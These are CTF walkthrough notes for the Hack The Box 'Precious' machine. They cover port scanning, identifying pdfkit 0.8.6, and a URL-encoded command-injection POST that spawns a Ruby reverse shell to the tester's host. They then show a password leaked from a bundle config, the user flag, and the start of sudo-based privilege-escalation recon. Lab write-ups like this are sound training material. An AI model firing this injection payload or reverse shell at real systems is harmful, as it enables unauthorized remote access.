#HackTheBox 
# 1- Enum
## nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Find
┌──(root㉿kali)-[/home/…/Desktop/HTB/precious/web]
└─# curl -X POST -d "url=http://10.10.16.30/" http://precious.htb --output pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11279  100 11256  100    23   6569     13  0:00:01  0:00:01 --:--:--  6584

┌──(root㉿kali)-[/home/…/Desktop/HTB/precious/web]
└─# exiftool pdf
[...]
Creator                         : Generated by [pdfkit v0.8.6]

# Exploit [pdfkit v0.8.6] vuln
#ExploitPostRequest
┌──(root㉿kali)-[/home/…/Desktop/HTB/precious/web]
└─# curl 'http://precious.htb' -X POST -d 'url=http%3A%2F%2F10.10.16.30%3A1234%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.16.30%22%2C1234%29%29%27%60'

# Foothold
[ruby@precious:~/.bundle$] cat config
	BUNDLE_HTTPS://RUBYGEMS__ORG/: "[henry:Q3c1AqGHtoI0aXAYFH]"

[ruby@precious:/home$] cd henry
[ruby@precious:/home/henry$] ls -la
	total 24
	drwxr-xr-x 2 henry henry 4096 Oct 26  2022 .
	drwxr-xr-x 4 root  root  4096 Oct 26  2022 ..
	lrwxrwxrwx 1 root  root     9 Sep 26  2022 .bash_history -> /dev/null
	-rw-r--r-- 1 henry henry  220 Sep 26  2022 .bash_logout
	-rw-r--r-- 1 henry henry 3526 Sep 26  2022 .bashrc
	-rw-r--r-- 1 henry henry  807 Sep 26  2022 .profile
	-rw-r----- 1 root  henry   33 May 13 18:17 user.txt
[ruby@precious:/home/henry$] su henry
	su henry
	Password: Q3c1AqGHtoI0aXAYFH

[henry@precious:~$] cat user.txt
	cat user.txt
	c209aa8535abea5700563a780abf75cd

# PrivEsc
henry@precious:~$ sudo -l
	User henry may run the following commands on precious:
	    (root) NOPASSWD:[ /usr/bin/ruby /opt/update_dependencies.rb]

## Find
[henry@precious:/tmp$] cat /opt/update_dependencies.rb

[henry@precious:/tmp$ ]find / -type f -name dependencies.yml 2>/dev/null                                 
	/opt/sample/dependencies.yml

[henry@precious:/tmp$] cat /opt/sample/dependencies.yml
	yaml: 0.1.1
	pdfkit: 0.8.6
